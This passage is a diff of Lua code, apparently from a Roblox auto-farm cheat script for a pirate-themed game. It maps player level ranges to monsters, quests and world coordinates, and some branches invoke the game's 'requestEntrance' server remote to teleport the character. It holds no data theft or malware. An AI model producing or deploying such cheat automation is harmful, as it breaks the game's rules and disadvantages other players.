+            CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0,
+                0.258804798, 0, 0.965929627);
+            CFrameMon = CFrame.new(-1140.083740234375, 14.809885025024414, 4322.92138671875);
+        elseif MyLevel == 60 or MyLevel <= 74 then
+            Mon = "Desert Bandit";
+            LevelQuest = 1;
+            NameQuest = "DesertQuest";
+            NameMon = "Desert Bandit";
+            CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0,
+                0.573571265, 0, 0.819155693);
+            CFrameMon = CFrame.new(924.7998046875, 6.44867467880249, 4481.5859375);
+        elseif MyLevel == 75 or MyLevel <= 89 then
+            Mon = "Desert Officer";
+            LevelQuest = 2;
+            NameQuest = "DesertQuest";
+            NameMon = "Desert Officer";
+            CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0,
+                0.573571265, 0, 0.819155693);
+            CFrameMon = CFrame.new(1608.2822265625, 8.614224433898926, 4371.00732421875);
+        elseif MyLevel == 90 or MyLevel <= 99 then
+            Mon = "Snow Bandit";
+            LevelQuest = 1;
+            NameQuest = "SnowQuest";
+            NameMon = "Snow Bandit";
+            CFrameQuest = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0,
+                -0.939684391, 0, -0.342042685);
+            CFrameMon = CFrame.new(1354.347900390625, 87.27277374267578, -1393.946533203125);
+        elseif MyLevel == 100 or MyLevel <= 119 then
+            Mon = "Snowman";
+            LevelQuest = 2;
+            NameQuest = "SnowQuest";
+            NameMon = "Snowman";
+            CFrameQuest = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0,
+                -0.939684391, 0, -0.342042685);
+            CFrameMon = CFrame.new(1201.6412353515625, 144.57958984375, -1550.0670166015625);
+        elseif MyLevel == 120 or MyLevel <= 149 then
+            Mon = "Chief Petty Officer";
+            LevelQuest = 1;
+            NameQuest = "MarineQuest2";
+            NameMon = "Chief Petty Officer";
+            CFrameQuest = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-4881.23095703125, 22.65204429626465, 4273.75244140625);
+        elseif MyLevel == 150 or MyLevel <= 174 then
+            Mon = "Sky Bandit";
+            LevelQuest = 1;
+            NameQuest = "SkyQuest";
+            NameMon = "Sky Bandit";
+            CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0,
+                -0.500031412, 0, 0.866007268);
+            CFrameMon = CFrame.new(-4953.20703125, 295.74420166015625, -2899.22900390625);
+        elseif MyLevel == 175 or MyLevel <= 189 then
+            Mon = "Dark Master";
+            LevelQuest = 2;
+            NameQuest = "SkyQuest";
+            NameMon = "Dark Master";
+            CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0,
+                -0.500031412, 0, 0.866007268);
+            CFrameMon = CFrame.new(-5259.8447265625, 391.3976745605469, -2229.035400390625);
+        elseif MyLevel == 190 or MyLevel <= 209 then
+            Mon = "Prisoner";
+            LevelQuest = 1;
+            NameQuest = "PrisonerQuest";
+            NameMon = "Prisoner";
+            CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -0.00000000500292918,
+                -0.995993316, 0.00000000160817859, 1, -0.00000000516744869, 0.995993316, -0.00000000206384709,
+                -0.0894274712);
+            CFrameMon = CFrame.new(5098.9736328125, -0.3204058110713959, 474.2373352050781);
+        elseif MyLevel == 210 or MyLevel <= 249 then
+            Mon = "Dangerous Prisoner";
+            LevelQuest = 2;
+            NameQuest = "PrisonerQuest";
+            NameMon = "Dangerous Prisoner";
+            CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -0.00000000500292918,
+                -0.995993316, 0.00000000160817859, 1, -0.00000000516744869, 0.995993316, -0.00000000206384709,
+                -0.0894274712);
+            CFrameMon = CFrame.new(5654.5634765625, 15.633401870727539, 866.2991943359375);
+        elseif MyLevel == 250 or MyLevel <= 274 then
+            Mon = "Toga Warrior";
+            LevelQuest = 1;
+            NameQuest = "ColosseumQuest";
+            NameMon = "Toga Warrior";
+            CFrameQuest = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0,
+                0.857167721, 0, -0.515037298);
+            CFrameMon = CFrame.new(-1820.21484375, 51.68385696411133, -2740.6650390625);
+        elseif MyLevel == 275 or MyLevel <= 299 then
+            Mon = "Gladiator";
+            LevelQuest = 2;
+            NameQuest = "ColosseumQuest";
+            NameMon = "Gladiator";
+            CFrameQuest = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0,
+                0.857167721, 0, -0.515037298);
+            CFrameMon = CFrame.new(-1292.838134765625, 56.380882263183594, -3339.031494140625);
+        elseif MyLevel == 300 or MyLevel <= 324 then
+            Mon = "Military Soldier";
+            LevelQuest = 1;
+            NameQuest = "MagmaQuest";
+            NameMon = "Military Soldier";
+            CFrameQuest = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0,
+                -0.866048813, 0, -0.499959469);
+            CFrameMon = CFrame.new(-5411.16455078125, 11.081554412841797, 8454.29296875);
+        elseif MyLevel == 325 or MyLevel <= 374 then
+            Mon = "Military Spy";
+            LevelQuest = 2;
+            NameQuest = "MagmaQuest";
+            NameMon = "Military Spy";
+            CFrameQuest = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0,
+                -0.866048813, 0, -0.499959469);
+            CFrameMon = CFrame.new(-5802.8681640625, 86.26241302490234, 8828.859375);
+        elseif MyLevel == 375 or MyLevel <= 399 then
+            Mon = "Fishman Warrior";
+            LevelQuest = 1;
+            NameQuest = "FishmanQuest";
+            NameMon = "Fishman Warrior";
+            CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734);
+            CFrameMon = CFrame.new(60878.30078125, 18.482830047607422, 1543.7574462890625);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    61163.8515625, 11.6796875, 1819.7841796875));
+            end
+        elseif MyLevel == 400 or MyLevel <= 449 then
+            Mon = "Fishman Commando";
+            LevelQuest = 2;
+            NameQuest = "FishmanQuest";
+            NameMon = "Fishman Commando";
+            CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734);
+            CFrameMon = CFrame.new(61922.6328125, 18.482830047607422, 1493.934326171875);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    61163.8515625, 11.6796875, 1819.7841796875));
+            end
+        elseif MyLevel == 450 or MyLevel <= 474 then
+            Mon = "God's Guard";
+            LevelQuest = 1;
+            NameQuest = "SkyExp1Quest";
+            NameMon = "God's Guard";
+            CFrameQuest = CFrame.new(-4721.88867, 843.874695, -1949.96643, 0.996191859, -0, -0.0871884301, 0, 1, -0,
+                0.0871884301, 0, 0.996191859);
+            CFrameMon = CFrame.new(-4710.04296875, 845.2769775390625, -1927.3079833984375);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    -4607.82275, 872.54248, -1667.55688));
+            end
+        elseif MyLevel == 475 or MyLevel <= 524 then
+            Mon = "Shanda";
+            LevelQuest = 2;
+            NameQuest = "SkyExp1Quest";
+            NameMon = "Shanda";
+            CFrameQuest = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0,
+                -0.906319618, 0, -0.422592998);
+            CFrameMon = CFrame.new(-7678.48974609375, 5566.40380859375, -497.2156066894531);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    -7894.6176757813, 5547.1416015625, -380.29119873047));
+            end
+        elseif MyLevel == 525 or MyLevel <= 549 then
+            Mon = "Royal Squad";
+            LevelQuest = 1;
+            NameQuest = "SkyExp2Quest";
+            NameMon = "Royal Squad";
+            CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-7624.25244140625, 5658.13330078125, -1467.354248046875);
+        elseif MyLevel == 550 or MyLevel <= 624 then
+            Mon = "Royal Soldier";
+            LevelQuest = 2;
+            NameQuest = "SkyExp2Quest";
+            NameMon = "Royal Soldier";
+            CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-7836.75341796875, 5645.6640625, -1790.6236572265625);
+        elseif MyLevel == 625 or MyLevel <= 649 then
+            Mon = "Galley Pirate";
+            LevelQuest = 1;
+            NameQuest = "FountainQuest";
+            NameMon = "Galley Pirate";
+            CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0,
+                -0.996196866, 0, 0.087131381);
+            CFrameMon = CFrame.new(5551.02197265625, 78.90135192871094, 3930.412841796875);
+        elseif MyLevel >= 650 then
+            Mon = "Galley Captain";
+            LevelQuest = 2;
+            NameQuest = "FountainQuest";
+            NameMon = "Galley Captain";
+            CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0,
+                -0.996196866, 0, 0.087131381);
+            CFrameMon = CFrame.new(5441.95166015625, 42.50205993652344, 4950.09375);
+        end
+    elseif World2 then
+        if MyLevel == 700 or MyLevel <= 724 then
+            Mon = "Raider";
+            LevelQuest = 1;
+            NameQuest = "Area1Quest";
+            NameMon = "Raider";
+            CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0,
+                0.974368095, 0, -0.22495985);
+            CFrameMon = CFrame.new(-728.3267211914062, 52.779319763183594, 2345.7705078125);
+        elseif MyLevel == 725 or MyLevel <= 774 then
+            Mon = "Mercenary";
+            LevelQuest = 2;
+            NameQuest = "Area1Quest";
+            NameMon = "Mercenary";
+            CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0,
+                0.974368095, 0, -0.22495985);
+            CFrameMon = CFrame.new(-1004.3244018554688, 80.15886688232422, 1424.619384765625);
+        elseif MyLevel == 775 or MyLevel <= 799 then
+            Mon = "Swan Pirate";
+            LevelQuest = 1;
+            NameQuest = "Area2Quest";
+            NameMon = "Swan Pirate";
+            CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376,
+                0, 0.139203906);
+            CFrameMon = CFrame.new(1068.664306640625, 137.61428833007812, 1322.1060791015625);
+        elseif MyLevel == 800 or MyLevel <= 874 then
+            Mon = "Factory Staff";
+            NameQuest = "Area2Quest";
+            LevelQuest = 2;
+            NameMon = "Factory Staff";
+            CFrameQuest = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 0.000000000896074881,
+                -0.999488771, 0.000000000136326533, 1, 0.000000000892172336, 0.999488771, -0.000000000107732087,
+                -0.0319722369);
+            CFrameMon = CFrame.new(73.07867431640625, 81.86344146728516, -27.470672607421875);
+        elseif MyLevel == 875 or MyLevel <= 899 then
+            Mon = "Marine Lieutenant";
+            LevelQuest = 1;
+            NameQuest = "MarineQuest3";
+            NameMon = "Marine Lieutenant";
+            CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0,
+                -0.500031412, 0, 0.866007268);
+            CFrameMon = CFrame.new(-2821.372314453125, 75.89727783203125, -3070.089111328125);
+        elseif MyLevel == 900 or MyLevel <= 949 then
+            Mon = "Marine Captain";
+            LevelQuest = 2;
+            NameQuest = "MarineQuest3";
+            NameMon = "Marine Captain";
+            CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0,
+                -0.500031412, 0, 0.866007268);
+            CFrameMon = CFrame.new(-1861.2310791015625, 80.17658233642578, -3254.697509765625);
+        elseif MyLevel == 950 or MyLevel <= 974 then
+            Mon = "Zombie";
+            LevelQuest = 1;
+            NameQuest = "ZombieQuest";
+            NameMon = "Zombie";
+            CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0,
+                0.95628953, 0, -0.29242146);
+            CFrameMon = CFrame.new(-5657.77685546875, 78.96973419189453, -928.68701171875);
+        elseif MyLevel == 975 or MyLevel <= 999 then
+            Mon = "Vampire";
+            LevelQuest = 2;
+            NameQuest = "ZombieQuest";
+            NameMon = "Vampire";
+            CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0,
+                0.95628953, 0, -0.29242146);
+            CFrameMon = CFrame.new(-6037.66796875, 32.18463897705078, -1340.6597900390625);
+        elseif MyLevel == 1000 or MyLevel <= 1049 then
+            Mon = "Snow Trooper";
+            LevelQuest = 1;
+            NameQuest = "SnowMountainQuest";
+            NameMon = "Snow Trooper";
+            CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0,
+                -0.92718488, 0, -0.374604106);
+            CFrameMon = CFrame.new(549.1473388671875, 427.3870544433594, -5563.69873046875);
+        elseif MyLevel == 1050 or MyLevel <= 1099 then
+            Mon = "Winter Warrior";
+            LevelQuest = 2;
+            NameQuest = "SnowMountainQuest";
+            NameMon = "Winter Warrior";
+            CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0,
+                -0.92718488, 0, -0.374604106);
+            CFrameMon = CFrame.new(1142.7451171875, 475.6398010253906, -5199.41650390625);
+        elseif MyLevel == 1100 or MyLevel <= 1124 then
+            Mon = "Lab Subordinate";
+            LevelQuest = 1;
+            NameQuest = "IceSideQuest";
+            NameMon = "Lab Subordinate";
+            CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0,
+                0.891015649, 0, 0.453972578);
+            CFrameMon = CFrame.new(-5707.4716796875, 15.951709747314453, -4513.39208984375);
+        elseif MyLevel == 1125 or MyLevel <= 1174 then
+            Mon = "Horned Warrior";
+            LevelQuest = 2;
+            NameQuest = "IceSideQuest";
+            NameMon = "Horned Warrior";
+            CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0,
+                0.891015649, 0, 0.453972578);
+            CFrameMon = CFrame.new(-6341.36669921875, 15.951770782470703, -5723.162109375);
+        elseif MyLevel == 1175 or MyLevel <= 1199 then
+            Mon = "Magma Ninja";
+            LevelQuest = 1;
+            NameQuest = "FireSideQuest";
+            NameMon = "Magma Ninja";
+            CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0,
+                -0.469463557, 0, -0.882952213);
+            CFrameMon = CFrame.new(-5449.6728515625, 76.65874481201172, -5808.20068359375);
+        elseif MyLevel == 1200 or MyLevel <= 1249 then
+            Mon = "Lava Pirate";
+            LevelQuest = 2;
+            NameQuest = "FireSideQuest";
+            NameMon = "Lava Pirate";
+            CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0,
+                -0.469463557, 0, -0.882952213);
+            CFrameMon = CFrame.new(-5213.33154296875, 49.73788070678711, -4701.451171875);
+        elseif MyLevel == 1250 or MyLevel <= 1274 then
+            Mon = "Ship Deckhand";
+            LevelQuest = 1;
+            NameQuest = "ShipQuest1";
+            NameMon = "Ship Deckhand";
+            CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016);
+            CFrameMon = CFrame.new(1212.0111083984375, 150.79205322265625, 33059.24609375);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    923.21252441406, 126.9760055542, 32852.83203125));
+            end
+        elseif MyLevel == 1275 or MyLevel <= 1299 then
+            Mon = "Ship Engineer";
+            LevelQuest = 2;
+            NameQuest = "ShipQuest1";
+            NameMon = "Ship Engineer";
+            CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016);
+            CFrameMon = CFrame.new(919.4786376953125, 43.54401397705078, 32779.96875);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    923.21252441406, 126.9760055542, 32852.83203125));
+            end
+        elseif MyLevel == 1300 or MyLevel <= 1324 then
+            Mon = "Ship Steward";
+            LevelQuest = 1;
+            NameQuest = "ShipQuest2";
+            NameMon = "Ship Steward";
+            CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125);
+            CFrameMon = CFrame.new(919.4385375976562, 129.55599975585938, 33436.03515625);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    923.21252441406, 126.9760055542, 32852.83203125));
+            end
+        elseif MyLevel == 1325 or MyLevel <= 1349 then
+            Mon = "Ship Officer";
+            LevelQuest = 2;
+            NameQuest = "ShipQuest2";
+            NameMon = "Ship Officer";
+            CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125);
+            CFrameMon = CFrame.new(1036.0179443359375, 181.4390411376953, 33315.7265625);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    923.21252441406, 126.9760055542, 32852.83203125));
+            end
+        elseif MyLevel == 1350 or MyLevel <= 1374 then
+            Mon = "Arctic Warrior";
+            LevelQuest = 1;
+            NameQuest = "FrostQuest";
+            NameMon = "Arctic Warrior";
+            CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0,
+                0.358349502, 0, -0.933587909);
+            CFrameMon = CFrame.new(5966.24609375, 62.97002029418945, -6179.3828125);
+            if _G.Settings.Main["Auto Farm"] and
+                (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                    -6508.5581054688, 5000.034996032715, -132.83953857422));
+            end
+        elseif MyLevel == 1375 or MyLevel <= 1424 then
+            Mon = "Snow Lurker";
+            LevelQuest = 2;
+            NameQuest = "FrostQuest";
+            NameMon = "Snow Lurker";
+            CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0,
+                0.358349502, 0, -0.933587909);
+            CFrameMon = CFrame.new(5407.07373046875, 69.19437408447266, -6880.88037109375);
+        elseif MyLevel == 1425 or MyLevel <= 1449 then
+            Mon = "Sea Soldier";
+            LevelQuest = 1;
+            NameQuest = "ForgottenQuest";
+            NameMon = "Sea Soldier";
+            CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0,
+                0.13915664, 0, 0.990270376);
+            CFrameMon = CFrame.new(-3028.2236328125, 64.67451477050781, -9775.4267578125);
+        elseif MyLevel >= 1450 then
+            Mon = "Water Fighter";
+            LevelQuest = 2;
+            NameQuest = "ForgottenQuest";
+            NameMon = "Water Fighter";
+            CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0,
+                0.13915664, 0, 0.990270376);
+            CFrameMon = CFrame.new(-3352.9013671875, 285.01556396484375, -10534.841796875);
+        end
+    elseif World3 then
+        if MyLevel == 1500 or MyLevel <= 1524 then
+            Mon = "Pirate Millionaire";
+            LevelQuest = 1;
+            NameQuest = "PiratePortQuest";
+            NameMon = "Pirate Millionaire";
+            CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0,
+                0.258804798, 0, 0.965929627);
+            CFrameMon = CFrame.new(-245.9963836669922, 47.30615234375, 5584.1005859375);
+        elseif MyLevel == 1525 or MyLevel <= 1574 then
+            Mon = "Pistol Billionaire";
+            LevelQuest = 2;
+            NameQuest = "PiratePortQuest";
+            NameMon = "Pistol Billionaire";
+            CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0,
+                0.258804798, 0, 0.965929627);
+            CFrameMon = CFrame.new(-187.3301544189453, 86.23987579345703, 6013.513671875);
+        elseif MyLevel == 1575 or MyLevel <= 1599 then
+            Mon = "Dragon Crew Warrior";
+            LevelQuest = 1;
+            NameQuest = "AmazonQuest";
+            NameMon = "Dragon Crew Warrior";
+            CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0,
+                0.438378751, 0, 0.898790359);
+            CFrameMon = CFrame.new(6141.140625, 51.35136413574219, -1340.738525390625);
+        elseif MyLevel == 1600 or MyLevel <= 1624 then
+            Mon = "Dragon Crew Archer [Lv. 1600]";
+            NameQuest = "AmazonQuest";
+            LevelQuest = 2;
+            NameMon = "Dragon Crew Archer";
+            CFrameQuest = CFrame.new(5833.1147460938, 51.60498046875, -1103.0693359375);
+            CFrameMon = CFrame.new(6616.41748046875, 441.7670593261719, 446.0469970703125);
+        elseif MyLevel == 1625 or MyLevel <= 1649 then
+            Mon = "Female Islander";
+            NameQuest = "AmazonQuest2";
+            LevelQuest = 1;
+            NameMon = "Female Islander";
+            CFrameQuest = CFrame.new(5446.8793945313, 601.62945556641, 749.45672607422);
+            CFrameMon = CFrame.new(4685.25830078125, 735.8078002929688, 815.3425903320312);
+        elseif MyLevel == 1650 or MyLevel <= 1699 then
+            Mon = "Giant Islander [Lv. 1650]";
+            NameQuest = "AmazonQuest2";
+            LevelQuest = 2;
+            NameMon = "Giant Islander";
+            CFrameQuest = CFrame.new(5446.8793945313, 601.62945556641, 749.45672607422);
+            CFrameMon = CFrame.new(4729.09423828125, 590.436767578125, -36.97627639770508);
+        elseif MyLevel == 1700 or MyLevel <= 1724 then
+            Mon = "Marine Commodore";
+            LevelQuest = 1;
+            NameQuest = "MarineTreeIsland";
+            NameMon = "Marine Commodore";
+            CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0,
+                -0.258804798, 0, -0.965929747);
+            CFrameMon = CFrame.new(2286.0078125, 73.13391876220703, -7159.80908203125);
+        elseif MyLevel == 1725 or MyLevel <= 1774 then
+            Mon = "Marine Rear Admiral [Lv. 1725]";
+            NameMon = "Marine Rear Admiral";
+            NameQuest = "MarineTreeIsland";
+            LevelQuest = 2;
+            CFrameQuest = CFrame.new(2179.98828125, 28.731239318848, -6740.0551757813);
+            CFrameMon = CFrame.new(3656.773681640625, 160.52406311035156, -7001.5986328125);
+        elseif MyLevel == 1775 or MyLevel <= 1799 then
+            Mon = "Fishman Raider";
+            LevelQuest = 1;
+            NameQuest = "DeepForestIsland3";
+            NameMon = "Fishman Raider";
+            CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0,
+                -0.469463557, 0, -0.882952213);
+            CFrameMon = CFrame.new(-10407.5263671875, 331.76263427734375, -8368.5166015625);
+        elseif MyLevel == 1800 or MyLevel <= 1824 then
+            Mon = "Fishman Captain";
+            LevelQuest = 2;
+            NameQuest = "DeepForestIsland3";
+            NameMon = "Fishman Captain";
+            CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0,
+                -0.469463557, 0, -0.882952213);
+            CFrameMon = CFrame.new(-10994.701171875, 352.38140869140625, -9002.1103515625);
+        elseif MyLevel == 1825 or MyLevel <= 1849 then
+            Mon = "Forest Pirate";
+            LevelQuest = 1;
+            NameQuest = "DeepForestIsland";
+            NameMon = "Forest Pirate";
+            CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0,
+                0.707079291, 0, 0.707134247);
+            CFrameMon = CFrame.new(-13274.478515625, 332.3781433105469, -7769.58056640625);
+        elseif MyLevel == 1850 or MyLevel <= 1899 then
+            Mon = "Mythological Pirate";
+            LevelQuest = 2;
+            NameQuest = "DeepForestIsland";
+            NameMon = "Mythological Pirate";
+            CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0,
+                0.707079291, 0, 0.707134247);
+            CFrameMon = CFrame.new(-13680.607421875, 501.08154296875, -6991.189453125);
+        elseif MyLevel == 1900 or MyLevel <= 1924 then
+            Mon = "Jungle Pirate";
+            LevelQuest = 1;
+            NameQuest = "DeepForestIsland2";
+            NameMon = "Jungle Pirate";
+            CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0,
+                -0.996196866, 0, -0.0871315002);
+            CFrameMon = CFrame.new(-12256.16015625, 331.73828125, -10485.8369140625);
+        elseif MyLevel == 1925 or MyLevel <= 1974 then
+            Mon = "Musketeer Pirate";
+            LevelQuest = 2;
+            NameQuest = "DeepForestIsland2";
+            NameMon = "Musketeer Pirate";
+            CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0,
+                -0.996196866, 0, -0.0871315002);
+            CFrameMon = CFrame.new(-13457.904296875, 391.545654296875, -9859.177734375);
+        elseif MyLevel == 1975 or MyLevel <= 1999 then
+            Mon = "Reborn Skeleton";
+            LevelQuest = 1;
+            NameQuest = "HauntedQuest1";
+            NameMon = "Reborn Skeleton";
+            CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+            CFrameMon = CFrame.new(-8763.7236328125, 165.72299194335938, 6159.86181640625);
+        elseif MyLevel == 2000 or MyLevel <= 2024 then
+            Mon = "Living Zombie";
+            LevelQuest = 2;
+            NameQuest = "HauntedQuest1";
+            NameMon = "Living Zombie";
+            CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+            CFrameMon = CFrame.new(-10144.1318359375, 138.62667846679688, 5838.0888671875);
+        elseif MyLevel == 2025 or MyLevel <= 2049 then
+            Mon = "Demonic Soul";
+            LevelQuest = 1;
+            NameQuest = "HauntedQuest2";
+            NameMon = "Demonic Soul";
+            CFrameQuest = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-9505.8720703125, 172.10482788085938, 6158.9931640625);
+        elseif MyLevel == 2050 or MyLevel <= 2074 then
+            Mon = "Posessed Mummy";
+            LevelQuest = 2;
+            NameQuest = "HauntedQuest2";
+            NameMon = "Posessed Mummy";
+            CFrameQuest = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-9582.0224609375, 6.251527309417725, 6205.478515625);
+        elseif MyLevel == 2075 or MyLevel <= 2099 then
+            Mon = "Peanut Scout";
+            LevelQuest = 1;
+            NameQuest = "NutsIslandQuest";
+            NameMon = "Peanut Scout";
+            CFrameQuest = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-2143.241943359375, 47.72198486328125, -10029.9951171875);
+        elseif MyLevel == 2100 or MyLevel <= 2124 then
+            Mon = "Peanut President";
+            LevelQuest = 2;
+            NameQuest = "NutsIslandQuest";
+            NameMon = "Peanut President";
+            CFrameQuest = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-1859.35400390625, 38.10316848754883, -10422.4296875);
+        elseif MyLevel == 2125 or MyLevel <= 2149 then
+            Mon = "Ice Cream Chef";
+            LevelQuest = 1;
+            NameQuest = "IceCreamIslandQuest";
